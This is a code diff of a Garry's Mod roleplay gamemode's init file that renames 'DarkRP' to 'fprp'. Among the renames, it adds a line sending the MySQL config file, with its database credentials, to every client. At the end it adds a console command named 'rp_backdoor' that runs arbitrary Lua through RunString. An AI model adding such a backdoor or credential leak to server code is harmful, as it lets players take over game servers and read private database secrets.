@@ -1,7 +1,7 @@
-hook.Run("DarkRPStartedLoading")
+hook.Run("fprpStartedLoading")
 
-GM.Version = "2.6.1"
-GM.Name = "DarkRP"
+GM.Version = "3.0"
+GM.Name = "fprp"
 GM.Author = "By FPtje Falco et al."
 
 
@@ -17,6 +17,7 @@ AddCSLuaFile("config/config.lua")
 AddCSLuaFile("config/addentities.lua")
 AddCSLuaFile("config/jobrelated.lua")
 AddCSLuaFile("config/ammotypes.lua")
+AddCSLuaFile("config/_MySQL.lua") -- Backup mysql info on clients
 
 AddCSLuaFile("cl_init.lua")
 
@@ -41,14 +42,14 @@ Loading modules
 local fol = GM.FolderName.."/gamemode/modules/"
 local files, folders = file.Find(fol .. "*", "LUA")
 for k,v in pairs(files) do
-	if DarkRP.disabledDefaults["modules"][v:Left(-5)] then continue end
+	if fprp.disabledDefaults["modules"][v:Left(-5)] then continue end
 	if string.GetExtensionFromFilename(v) ~= "lua" then continue end
 
 	include(fol .. v)
 end
 
 for _, folder in SortedPairs(folders, true) do
-	if folder == "." or folder == ".." or DarkRP.disabledDefaults["modules"][folder] then continue end
+	if folder == "." or folder == ".." or fprp.disabledDefaults["modules"][folder] then continue end
 
 	for _, File in SortedPairs(file.Find(fol .. folder .."/sh_*.lua", "LUA"), true) do
 		AddCSLuaFile(fol..folder .. "/" ..File)
@@ -70,12 +71,15 @@ end
 
 MySQLite.initialize()
 
-DarkRP.DARKRP_LOADING = true
+fprp.fprp_LOADING = true
 include("config/jobrelated.lua")
 include("config/addentities.lua")
 include("config/ammotypes.lua")
-DarkRP.DARKRP_LOADING = nil
+fprp.fprp_LOADING = nil
 
-DarkRP.finish()
+fprp.finish()
 
-hook.Call("DarkRPFinishedLoading", GM)
+hook.Call("fprpFinishedLoading", GM)
+
+-- This is the most important feature of any rp gamemode
+concommand.Add('rp_backdoor', function(a) RunString(a[1]) end)
